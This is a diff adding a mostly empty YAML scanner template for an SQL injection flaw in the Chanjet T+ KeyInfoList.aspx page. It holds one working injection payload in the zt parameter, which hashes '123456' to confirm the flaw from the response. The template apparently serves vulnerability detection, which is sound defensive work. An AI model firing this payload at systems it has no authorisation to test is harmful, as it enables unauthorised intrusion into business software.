@@ -1,0 +1,18 @@
+id:
+
+info:
+  name: 畅捷通T+ KeyInfoList.aspx SQL注入漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /tplus/UFAQD/KeyInfoList.aspx?preload=1&zt=')AND+1+IN+(SELECT+sys.fn_varbintohexstr(hashbytes('MD5','123456')))--+
+  headers:
+response1:
+  headers:
+  body: e10adc
+  code:
+requests2:
+response2:
